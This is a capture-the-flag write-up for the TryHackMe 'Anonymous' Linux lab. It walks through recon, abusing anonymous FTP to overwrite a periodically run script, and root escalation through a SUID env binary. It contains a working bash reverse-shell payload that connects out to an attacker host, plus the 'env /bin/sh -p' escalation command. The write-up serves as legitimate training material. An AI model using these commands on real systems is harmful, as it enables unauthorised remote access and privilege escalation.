# Anonymous - TryHackMe

Linux machine combining anonymous FTP access, a writable script executed by the system, and
a SUID binary exploitable via GTFOBins. No credentials are needed at any stage - the whole
chain runs on misconfigurations.

Target: `10.63.142.87`

---

## Reconnaissance

```bash
nmap -sC -sV -T4 10.63.142.87
```

- FTP (21) - anonymous login enabled
- SMB (139, 445) - guest access available
- SSH (22) - present, not needed

SMB guest access doesn't lead anywhere (`enum4linux` shows nothing beyond the guest
session), so FTP is the actual entry point.

---

## Enumeration

```bash
ftp 10.63.142.87
```

Anonymous login gives access to a writable `/scripts` directory:

- `clean.sh`
- `removed_files.log`
- `to_do.txt`

`clean.sh` is writable - if something on the system runs it periodically, overwriting it
means remote code execution.

---

## Initial Access - Script Injection

Overwrite `clean.sh` with a reverse shell payload:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.63.108.42/4444 0>&1
```

Upload it over FTP:

```
put clean.sh
```

Start a listener and wait for the next execution:

```bash
nc -lvnp 4444
```

Shell received. User flag is readable from the home directory.

---

## Privilege Escalation

```bash
find / -user root -perm -u=s 2>/dev/null
```

`/usr/bin/env` has the SUID bit set. Per GTFOBins, that's enough for a root shell:

```bash
env /bin/sh -p
whoami
```

```
root
```

Root flag is in `/root/`.

---

## Key Takeaways

- Anonymous FTP with a writable directory is dangerous whenever something on the system
  executes files from it - check for cron jobs or watchers before assuming it's just storage.
- SMB guest access is worth a quick look but isn't automatically a way in - don't spend more
  time on it than the first `enum4linux` pass.
- SUID binaries should always be checked against GTFOBins before assuming they need custom
  exploitation.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were
performed strictly for educational purposes.
